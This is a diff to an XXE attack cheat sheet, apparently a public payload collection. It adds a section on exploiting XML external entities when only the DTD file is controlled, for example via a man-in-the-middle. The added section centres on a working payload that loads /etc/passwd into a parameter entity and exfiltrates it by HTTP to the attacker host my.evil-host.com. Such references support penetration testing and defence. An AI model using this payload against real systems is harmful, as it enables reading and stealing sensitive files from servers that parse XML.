@@ -31,6 +31,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [XXE inside SOAP](#xxe-inside-soap)
   - [XXE inside DOCX file](#xxe-inside-docx-file)
   - [XXE inside XLSX file](#xxe-inside-xlsx-file)
+  - [XXE inside DTD file](#xxe-inside-dtd-file)
 - [XXE WAF Bypass via convert character encoding](#xxe-waf-bypass-via-convert-character-encoding)
 
 ## Tools
@@ -514,6 +515,21 @@ updating: xl/theme/theme1.xml (deflated 80%)
 updating: xl/_rels/ (stored 0%)
 updating: xl/_rels/workbook.xml.rels (deflated 66%)
 updating: xl/sharedStrings.xml (deflated 17%)
+```
+
+### XXE inside DTD file
+
+Most XXE payloads detailed above require control over both the DTD or `DOCTYPE` block as well as the `xml` file.
+In rare situations, you may only control the DTD file and won't be able to modify the `xml` file. For example, a MITM.
+When all you control is the DTD file, and you do not control the `xml` file, XXE may still be possible with this payload.
+
+```xml
+<!-- Load the contents of a sensitive file into a variable -->
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+%param1;
+%external;
 ```
 
 ### XXE WAF Bypass via convert character encoding
